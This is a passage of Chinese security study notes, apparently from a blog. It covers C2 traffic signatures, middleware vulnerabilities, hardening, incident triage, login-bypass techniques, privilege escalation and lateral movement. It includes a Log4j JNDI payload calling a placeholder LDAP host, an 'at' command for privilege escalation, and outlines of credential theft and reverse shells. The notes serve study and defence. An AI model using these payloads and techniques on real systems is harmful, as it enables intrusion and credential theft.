class="line">5、成功触发Payload，在DNSLog获取到目标IP。</span><br></pre></td></tr></table></figure>

<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>1，端口号：msf默认使用4444端口作为反向连接端口</p>
<p>2，数据内容：msf数据包通常包含特定字符串:(“meterpreter”、”revshell”等)</p>
<h3 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h3><ol>
<li><strong>心跳包</strong></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">被控端会向服务端发送心跳包。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此外，我们还可以使用CS的心跳指令来提取其特征。通常情况下，CS会定期向C2服务器发送心跳包，以保持与服务器的连接。我们可以使用Wireshark等工具，捕获并分析这些心跳包，以识别出CS的特征</span><br></pre></td></tr></table></figure>

<p><strong>心跳特征</strong></p>
<p>  被控端会向服务端发送心跳包。心跳包是一种延迟发送的数据包，默认间隔为 60 秒。</p>
<p><strong>心跳包长度</strong></p>
<p>  心跳包长度固定（长度根据不同的会话或者 CS 版本来提取特征），如果是 http 隧道，则心跳包访问的 url 也是固定。</p>
<p><strong>证书特征</strong></p>
<p>  Cobalt Strike 流量中 tls1.2 流量的证书特征。</p>
<h2 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><p>IIS的全称是Internet Information Services（互联网信息服务），是微软提供的运行在Windows系统下的中间件，主要用来解析.ASP，.ASA，.CER三种文件格式的文件</p>
<p>1、PUT漏洞</p>
<p>2、短文件名猜解</p>
<p>3、远程代码执行</p>
<p>4、解析漏洞</p>
<p>IIS 7.0</p>
<p>上传合法的“图片”（图片木马）然后在URL后面加上“&#x2F;xxx.php”，就可以获得网站的WebShell，在使用菜刀链接即可。</p>
<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>1、解析漏洞</p>
<p>2、目录遍历</p>
<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>1、文件解析</p>
<p>2、目录遍历</p>
<p>3、CRLF注入</p>
<p>4、目录穿越</p>
<h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a><strong>Tomcat</strong></h3><p>1、远程代码执行</p>
<p>2、war后门文件部署</p>
<h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><p>7001&#x2F;7002端口 t3协议</p>
<p>权限绕过漏洞（CVE-2020-14882）和后台任意命令执行漏洞（CVE-2020-14883）<strong>组合拳漏洞</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">基于T3协议weblogic的反序列化漏洞</span><br><span class="line">EXP和目标服务器建立T3连接，目标服务器weblogic上的JVM虚拟机远程调用了监听程序中的方法执行序列化操作，将流量反弹到nc上</span><br><span class="line"></span><br><span class="line">CVE-2017-10271 反序列化漏洞是因为使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令</span><br><span class="line"></span><br><span class="line">Weblogic 文件上传漏洞</span><br><span class="line"></span><br><span class="line">Weblogic LDAP 远程代码执行漏洞</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>流量特征:不加密，常见的出网协议也可以用。有很多T3协议的特征，文件操作和冰蝎一样有<strong>file-out-stream</strong>字段。</p>
<h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p>fastjson可以实现java对象和Json字符串的相互转换，fastJson漏洞时由于引进了AutoType功能，fastjson在对json字符串反序列化的时候，会读取到@type的内容，将json内容反序列化为java对象并调用这个类的setter方法。</p>
<p>fastjson漏洞最基本的<strong>特征就是@Type字段</strong>，若靶机出网通常会使用rmi进行反弹shell等操作。</p>
<h3 id="Log4j-1"><a href="#Log4j-1" class="headerlink" title="Log4j"></a>Log4j</h3><p>漏洞原理是log4j2在进行日志记录时会将pattern中用${}包裹起来的变量进行解析，并替换为解析后的值，插入到日志记录的语句中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP请求中包含特定的JNDI注入Payload，如 $&#123;jndi:ldap://x.x.x.x:1389/Exploit&#125;</span><br><span class="line">HTTP请求中包含特定的User-Agent头，如“ Log4j2”或“ Log4jAPI/2.0.8”等</span><br><span class="line">HTTP响应中包含特定的响应码，如“2.0K”等</span><br><span class="line">HTTP响应中包含特定的响应内容，如“JNDI lookup successful”等</span><br></pre></td></tr></table></figure>

<h3 id="Struct2"><a href="#Struct2" class="headerlink" title="Struct2"></a>Struct2</h3><p><em><strong>S2-053</strong></em></p>
<p><strong>漏洞原理：</strong><br>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成了一个OGNL表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
<p>特征：请求头**包含 %{}**，请求体和响应体都包含 payload。</p>
<h2 id="SSH加固"><a href="#SSH加固" class="headerlink" title="SSH加固"></a>SSH加固</h2><p><strong>防火墙</strong></p>
<p><strong>堡垒机</strong></p>
<p>堡垒主是专门设计用于阻止来自网络的恶意流量和攻击的安全网关。堡垒在公共网络上公开的安全代理和审计服务，通过堡垒机和限制和审计用户操作，记录用户操作，可以对可疑操作进行告警或者直接阻断从而减少对主机威胁。当两个通道建立SSH连接时，设置堡垒主机可能有助于提高安全性并保护系统。</p>
<p><strong>修改默认SSH设置</strong></p>
<p>1.更改默认22端口  修改&#x2F;etc&#x2F;ssh&#x2F;sshd_config文件</p>
<p>2.禁用root登录</p>
<h2 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a><strong>安全加固</strong></h2><p>1.<strong>口令复杂度策略</strong></p>
<p>​	 口令长度至少8位，并包括数字、小写字母、大写字母和特殊符号</p>
<p>2.<strong>多次登录失败锁定策略</strong></p>
<p>​	系统应配置当用户连续认证失败次数超过5次，锁定该用户使用的账号</p>
<p>3.<strong>多余账户锁定策略</strong></p>
<p>应锁定与设备运行、维护等工作无关的账号。</p>
<p>4.<strong>关键目录权限控制</strong></p>
<p>根据安全需要，配置某些关键目录其所需的最小权限；</p>
<p><strong>5.日志文件权限</strong></p>
<p>只能追加数据，不能删除日志文件</p>
<p>6.<strong>防止SQL注入及远程包含</strong></p>
<p>SQL注入是非常危险的问题，小则网站后台被入侵，重则整个服务器沦陷，所以一定要小心。</p>
<p>php.ini中有一个设置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc = Off	改为     magic_quotes_gpc = On</span><br></pre></td></tr></table></figure>

<p>在远程文件包含漏洞中，攻击者可以通过访问外部地址来加载远程代码，所以一定要设置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = off</span><br></pre></td></tr></table></figure>

<p>7.<strong>不使用默认密码和弱口令</strong></p>
<p>检查各个组件或者数据库等的默认密码和弱口令，口令长度至少8位，并包括数字、小写字母、大写字母和特殊符号四类中至少两种</p>
<p>8.<strong>禁止远程连接数据库</strong></p>
<p>使用命令netstat 查看默认的3306端口是打开的，此时打开了mysql的网络监听，允许用户远程通过帐号密码连接数本地据库，默认情况是允许远程连接数据的。为了禁止该功能，启动skip-networking，不监听sql的任何TCP&#x2F;IP的连接，切断远程访问的权利，保证安全性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/my.cf       #将#skip-networking注释去掉</span><br></pre></td></tr></table></figure>

<p>9.<strong>对重要数据加密存储</strong></p>
<p>10.<strong>修改网站的某些默认端口</strong></p>
<h2 id="内存马排查"><a href="#内存马排查" class="headerlink" title="内存马排查"></a>内存马排查</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">作为应急或者运维人员，当遇到疑似内存马的安全事件时，该如何去快速确认内存马是否存在以及确认内存马的位置呢？大体思路如下</span><br><span class="line"></span><br><span class="line">先查看检查服务器web日志，查看是否有可疑的web访问日志，比如说filter或者listener类型的内存马，会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的请求。</span><br><span class="line"></span><br><span class="line">如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</span><br><span class="line"></span><br><span class="line">查看是否有类似哥斯拉、冰蝎特征的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。</span><br><span class="line"></span><br><span class="line">通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。</span><br><span class="line"></span><br><span class="line">查杀工具</span><br><span class="line">java-memshell-scanner</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="进程排查思路"><a href="#进程排查思路" class="headerlink" title="进程排查思路"></a><strong>进程排查思路</strong></h2><p>进程排查思路(火绒剑都可查看到)</p>
<ul>
<li>没有签名验证信息的进程</li>
<li>没有描述信息的进程</li>
<li>进程的启动用户</li>
<li>进程的路径是否合法</li>
<li>CPU或内存资源占用长时间过高的进程</li>
</ul>
<h2 id="登陆框可能存在的漏洞"><a href="#登陆框可能存在的漏洞" class="headerlink" title="登陆框可能存在的漏洞"></a>登陆框可能存在的漏洞</h2><ol>
<li><p>首先看一下有没有对应的cms，如果是，则可以查一下该cms的历史漏洞</p>
</li>
<li><p>看登陆框是否可以进行用户名爆破</p>
</li>
<li><p>看有没有验证码，如果有，试试能不能绕过</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">一、前端验证验证码，并没有后端验证。直接抓包然后进行跑数据包，反正有没有验证码的阻碍</span><br><span class="line"></span><br><span class="line">二、验证码设置了但是并没有效验，乱输验证码也能够成功的登录（估计老板没给开发工资吧）</span><br><span class="line"></span><br><span class="line">三、验证码可重复使用，如果验证码认证成功后没有将session及时清空，将会导致验证码首次认证成功之后可重复使用。</span><br><span class="line">实例: https://blog.csdn.net/</span><br><span class="line">四、空验证码绕过，验证码空值绕过，可以通过直接删除验证码参数或者Cookie中的值来绕过判断，进行暴力破解。</span><br><span class="line"></span><br><span class="line">五、验证码干扰过低，轻松使用脚本识别 https://blog.csdn.net/y0nghum1ng/</span><br><span class="line"></span><br><span class="line">六：验证码会在HTML页面输出。 https://blog.csdn.net/weixin_45606067/</span><br><span class="line"></span><br><span class="line">七、验证码可控制，比如他的验证码包含在URL里面，是一个URL传参，我们可以把URL设置定，那么验证码则可控制</span><br><span class="line"></span><br><span class="line">八、验证码有规则，比如是时间戳的后6位（rand函数进行随机数）</span><br><span class="line"></span><br><span class="line">九、有万能验证码，验证码无论是什么，只要输入000000就能直接绕过</span><br><span class="line"></span><br><span class="line">十、验证码有的时候会藏在cookie里面，分析一下是不是存在验证码的参数</span><br><span class="line"></span><br><span class="line">十一、图片验证码，自动识别 http://weikeu.com/archives/ </span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>登录框处看看是否存在sql注入 </p>
</li>
<li><p>是否存在弱口令或者万能密码</p>
</li>
<li><p>看看有没有注册或者找回密码功能，测试这两个功能的漏洞</p>
</li>
<li><p>还可以通过查看响应包，看看修改响应包的值能不能达到绕过检测的目的</p>
</li>
</ol>
<h2 id="HTTP字段"><a href="#HTTP字段" class="headerlink" title="HTTP字段"></a>HTTP字段</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Host：ip 指定主机名称 </span><br><span class="line"></span><br><span class="line">Accept:表示客户端期望服务器返回的媒体格式。</span><br><span class="line"></span><br><span class="line">Content-Length:响应体的长度 </span><br><span class="line"></span><br><span class="line">Content-Type：内容的类型，text／html，xml等 Server：服务器的信息 </span><br><span class="line"></span><br><span class="line">Connection:当客户端和服务器需要协商连接的属性时，可以使用Connection头部。比较常用的一个值是close，用来通知对方在当前请求结束后关闭连接。</span><br><span class="line"></span><br><span class="line">Referer:Referer是非常常用的头，它表示请求的发起来源URI，也就是当前页面资源的父页面。</span><br><span class="line"></span><br><span class="line">X-Forwarded-For:是一个 HTTP 扩展头部，主要是为了让 Web 服务器获取访问用户的真实 IP 地址，但是这个IP却未必是真实的，</span><br></pre></td></tr></table></figure>

<h2 id="挖矿木马排查"><a href="#挖矿木马排查" class="headerlink" title="挖矿木马排查"></a>挖矿木马排查</h2><p><strong>确定挖矿进程</strong></p>
<ol>
<li>可以使用命令直接筛选出占用CPU过高的可疑进程。</li>
<li>部分挖矿进程的名字由不规则数字和字母组成，可直接看出，如ddg的qW3xT.4或zigw</li>
<li>进程会修改进程名为常见名称，干扰运维人员，这种伪装方法比较简单（比如利用XHide修改进程名或直接修改可执行文件名），所以排查过程中也要关注所有占用CPU较高的可疑进程。</li>
</ol>
<p>如果确定了可疑进程，可以使用查看进程打开的文件，或查看指向的文件。</p>
<p>如果挖矿木马有隐藏进程的功能，那么很难直接从top中确定可疑进程名。这时，可从以下几方面进行排查：</p>
<ol>
<li>是否替换了系统命令</li>
</ol>
<p>使用查看系统命令是否被替换，如果系统命令已经被替换，可直接从纯净系统拷贝ps，top，等命令到受感染主机上使用。</p>
<ol start="2">
<li>是否修改了动态链接库</li>
</ol>
<p>如果找不到占用CPU较高的进程，可考虑排查是否修改了动态链接库，使用或命令查看是否有预加载的动态链接库文件。</p>
<p><strong>查看挖矿进程所属用户</strong></p>
<p>一般挖矿进程为自动化攻击脚本，所以很少有提权的过程，那么很大可能挖矿进程所属用户即为攻击进入系统的用户。后续的排查过程可根据此寻找攻击者的入侵途径。</p>
<p><strong>查看用户进程</strong></p>
<p>确定已失陷用户后，可查询该用户所属其他进程，判断其他进程是否有已知漏洞&#x3D;</p>
<p><strong>确定原因</strong></p>
<p>排查出挖矿木马后对木马类型进行分析，根据木马的传播特征和传播方式，初步判断本次入侵的原因。然后结合应用日志以及漏洞利用残留文件确定本次攻击是否利用了该漏洞。</p>
<p><strong>清除挖矿木马</strong></p>
<ol>
<li>及时隔离主机</li>
<li>阻断与矿池通讯</li>
<li>清除定时任务</li>
<li>清除启动项</li>
</ol>
<h2 id="session-cookie-token区别"><a href="#session-cookie-token区别" class="headerlink" title="session cookie token区别"></a>session cookie token区别</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> session：理解为是&quot;会话&quot;，代表着服务器和客户端一次会话的过程   当用户打开某个web应用时，便与web服务器产生一次session 服务器使用session把用户的信息临时保存在了服务器上，用户离开网站后session会被销毁。这种用户信息存储方式相对cookie来说更安全，可是session有一个缺陷：如果web服务器做了负载均衡，那么下一个操作请求到了另一台服务器的时候session会丢失。</span><br><span class="line"></span><br><span class="line">cookie：保持用户的登录状态，是保存在本地终端的数据。cookie由服务器生成，发送给浏览器，浏览器把cookie以kv形式保存到某个目录下的文本文件内，下一次请求同一网站时会把该cookie发送给服务器。由于cookie是存在客户端上的，所以浏览器加入了一些限制确保cookie不会被恶意使用，同时不会占据太多磁盘空间，所以每个域的cookie数量是有限的。</span><br><span class="line"></span><br><span class="line">token：令牌，比如你授权（登录）一个程序时，他就是个依据，判断你是否已经授权该软件</span><br></pre></td></tr></table></figure>

<h3 id="有cdn的网站如何获取真实IP"><a href="#有cdn的网站如何获取真实IP" class="headerlink" title="有cdn的网站如何获取真实IP"></a>有cdn的网站如何获取真实IP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 超级ping  如果ip不一样  说明有cdn</span><br><span class="line"></span><br><span class="line">2. nslookup **http://xxx.com** 国外dns</span><br><span class="line"></span><br><span class="line">3. 查找域名历史解析记录，因为域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址</span><br><span class="line"></span><br><span class="line">4. 子域名查询 一般子域名没有cdn</span><br><span class="line"></span><br><span class="line">5. 邮件服务查询</span><br></pre></td></tr></table></figure>



<h3 id="redis未授权漏洞"><a href="#redis未授权漏洞" class="headerlink" title="redis未授权漏洞"></a>redis未授权漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">条件</span><br><span class="line"></span><br><span class="line">1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</span><br><span class="line">2.没有设置密码认证（一般为空），可以免密码(认证)远程登录redis服务。</span><br><span class="line"></span><br><span class="line">服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器</span><br></pre></td></tr></table></figure>

<h2 id="常见的高危端口"><a href="#常见的高危端口" class="headerlink" title="常见的高危端口"></a>常见的高危端口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">21 FTP（文件传输协议）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">22 SSH（安全外壳协议）</span><br><span class="line"></span><br><span class="line">23 Telnet</span><br><span class="line"></span><br><span class="line">53 DNS</span><br><span class="line"></span><br><span class="line">135   RPC（远程过程调用）</span><br><span class="line"></span><br><span class="line">139：SMB共享 和445windows版本不一样</span><br><span class="line"></span><br><span class="line">443：HTTPS端口，心脏滴血等与SSL有关的漏洞</span><br><span class="line"></span><br><span class="line">445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010 （tcp）</span><br><span class="line"></span><br><span class="line">1433：SQL Server对外提供服务端口</span><br><span class="line"></span><br><span class="line">1521：oracle数据库端口</span><br><span class="line"></span><br><span class="line">3306：MySQL数据库端口，可能存在 弱口令暴力破解</span><br><span class="line"></span><br><span class="line">3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现</span><br><span class="line"></span><br><span class="line">6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞</span><br><span class="line"></span><br><span class="line">7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞</span><br><span class="line"></span><br><span class="line">8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell   （tcp）</span><br><span class="line">8080-8090：可能存在web服务</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="挖洞流程"><a href="#挖洞流程" class="headerlink" title="挖洞流程"></a>挖洞流程</h2><p><strong>这里瞎写的</strong> 实际要看针对的目标，是挖src还是挖cnvd这种</p>
<p>拿到一个主站的域名之后</p>
<p>1.信息搜集</p>
<p>利用oneforall和一些在线子域名爆破网站进行一下子域名的爆破，然后进行去重，再利用fofa等网站探查一下一些站点的指纹和框架。看看有没有一些cms可以利用。   whois反查</p>
<p>2.漏洞测试</p>
<p>根据筛选的站点，有针对性的进行端口探测，目录探测，看看有没有站长留下的一些敏感文件或者压缩包之类的。根据端口的开放情况有针对性的进行漏洞利用检测。</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a><strong>反序列化</strong></h2><p>java的反序列化，普遍特征：</p>
<p>对于没有回显的情况，查看十六进制</p>
<p>TCP：必有aced0005，这个16进制流基本上也意味者java反序列化的开始；</p>
<p>HTTP：必有rO0AB，其实这就是aced0005的base64编码的结果；</p>
<h3 id="Fastjson-1"><a href="#Fastjson-1" class="headerlink" title="Fastjson"></a>Fastjson</h3><p>原理也是jdni注入 利用就是构造一个json字符，用@type指定一个类库，流量特征就是json autotype</p>
<h3 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h3><h3 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h3><p>漏洞原理：Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值-&gt;Base64解码–&gt;AES解密–&gt;反序列化。然而<strong>AES</strong>的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p>
<p>Shiro反序列化有两种常用的加密模式，分别是<strong>CBC和GCM</strong></p>
<h3 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h3><p><strong>shiro550</strong></p>
<p>加密算法是AES 算法，算法很安全，但是秘钥是固定的，并且存储于源码中。</p>
<p><strong>shiro 721</strong></p>
<p>AES 秘钥不在是固定的了，但是此秘钥可以被爆破</p>
<p><strong>流量特征：</strong></p>
<ol>
<li><p>在返回包的 Set-Cookie 中存在 <code>rememberMe=deleteMe</code> 字段，但是可能存在误报，可以尝试使用常见的AES密钥对rememberMe的值进行遍历解密尝试，如果可以成功解密的话再对解密的结果进行常见利用链的关键类名特征检测</p>
</li>
<li><p>返回的数据包含有多个$$$符号，C参数有base64编码</p>
</li>
<li><p>返回包中存在base64加密数据，该数据可作为攻击成功的判定条件。</p>
</li>
</ol>
<h4 id="shiro有key无链利用"><a href="#shiro有key无链利用" class="headerlink" title="shiro有key无链利用"></a>shiro有key无链利用</h4><p>​	一般用shiro_tool这一款工具，看看可不可以用JRMPClient来利用。先看JRMPClient是否存在，如果存在。 接下来就在vps上起一个JRMPListener，然后配合shiro_tool尝试</p>
<h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><p><img src="/images/image-20230522163000534.png" alt="image-20230522163000534"></p>
<h2 id="常见提权"><a href="#常见提权" class="headerlink" title="常见提权"></a>常见提权</h2><h3 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h3><p><strong>1.mysql  UDF提权</strong></p>
<p>UDF提权（利用了root 高权限，创建有cmd函数的udf.dll动态库，导出 那个文件后，就可以框输入 cmd，mof（系统会创建一个临时文件，创建的时候用的是system，把cmd命令放在mof上执行）</p>
<p>提权的<strong>前提</strong></p>
<ul>
<li>mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib&#x2F;plugin文件夹下</li>
<li>mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:windows\system32目录，在windows server - - 2000下放置在c:winnt\system32目录。</li>
<li>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。拥有可以将udf.dll写入相应目录的权限。</li>
<li>版本大于5.1的udf.dll放到mysql安装目录的libplugin文件夹才能创建自定义函数。目录默认是不存在的需要自己创建，在安装目录下创建libplugin文件夹，然后将udf.dll导出到这个目录。</li>
</ul>
<p>利用msf进行UDF提权</p>
<p>使用mysql_udf_payload模块<br>适应于5.5.9以下</p>
<p><strong>2. 2003  at提权     0点计划任务   执行cmd窗口</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 00:00 /interaction cmd.exe</span><br></pre></td></tr></table></figure>

<p>sc提权</p>
<p><strong>3.redis未授权提权</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(1).利用计划任务执行命令反弹shell</span><br><span class="line"></span><br><span class="line">(2).写ssh-keygen公钥然后使用私钥登录</span><br></pre></td></tr></table></figure>



<p><strong>4.令牌窃取配合烂土豆提权</strong></p>
<p>如果单单用令牌窃取,可能权限太低,无法窃取。例如,如果是web权限(IIS类似的服务权限)</p>
<p>非服务类用户权限无法窃取成功(原理)</p>
<p>过程:上传烂土豆-执行烂土豆-利用窃取模块-窃取SYSTEM-成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.利用msf生成后门，监听端口</span><br><span class="line">2.反弹shell后运行烂土豆进行提权</span><br></pre></td></tr></table></figure>

<p><strong>5. 常用的补丁提权，syteminfo复制系统信息，拿去辅助提权。</strong></p>
<h3 id="LINUX提权"><a href="#LINUX提权" class="headerlink" title="LINUX提权"></a>LINUX提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.内核漏洞脏牛提权</span><br><span class="line">2.计划任务提权</span><br><span class="line">3.sudo提权</span><br><span class="line">4.第三方服务提权 比如数据库</span><br></pre></td></tr></table></figure>

<h2 id="内网渗透思路"><a href="#内网渗透思路" class="headerlink" title="内网渗透思路"></a>内网渗透思路</h2><p>拿下一台服务器后，可以看到我们不是最高权限，如果不是第一步肯定是要进行权限提升的，</p>
<ul>
<li>提权</li>
</ul>
<p>先进行主机信息的收集，查看主机的系统版本，修复的补丁。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<ul>
<li>内网信息收集</li>
</ul>
<ol>
<li>去找存在的路由信息和内网存活主机 arpscan</li>
<li>搜集浏览器等软件的信息，方便制作密码本</li>
<li>本机运行的服务</li>
<li>端口信息，比如3389这种</li>
<li>搜集域环境相关信息，比如域内用户、组、域名等。net time &#x2F;domai 这种会显示域控的名称</li>
</ol>
<ul>
<li><p>口令爆破</p>
</li>
<li><p>凭据窃取</p>
</li>
</ul>
<p>mimikatz等抓取本地密码</p>
<ul>
<li>横向渗透</li>
</ul>
<p>ipc–计划任务</p>
<ol>
<li><p>开启了139、445端口 2. admin$共享 3.账户密码 利用PSexec去工具</p>
</li>
<li><p>计划任务横向 at命令横向 win2003以下 schtasks 2008 at不能用的情况下</p>
</li>
</ol>
<p>PTH 哈希传递攻击 利用ntlm-hash</p>
<p>PTK 密钥传递攻击 利用AES hash</p>
<p>PTT 票据传递攻击 黄金白银票据</p>
<p>利用一些远程桌面工具进行横向</p>
<p>DCOM横向</p>
<ul>
<li>拿下域控</li>
</ul>
<ol>
<li>通过高权限读取本地密码</li>
<li>server2008有效 MS14068 普通用户提权到域控权限</li>
<li>窃取域管理员运行的服务的令牌，从而控制整个域。</li>
</ol>
<ul>
<li>权限维持</li>
</ul>
<ol>
<li>黄金、白银票据</li>
<li>计划任务</li>
<li>启动项后门</li>
<li>WMI配合Powershell实现无文件后门</li>
</ol>
<h3 id="黄金票据和白银票据"><a href="#黄金票据和白银票据" class="headerlink" title="黄金票据和白银票据"></a>黄金票据和白银票据</h3><p>白银票据通常用于攻击域控，黄金票据则用于拿下域控后权限维持，且黄金票据是伪造发票人，而白银票据则是伪造门票。</p>
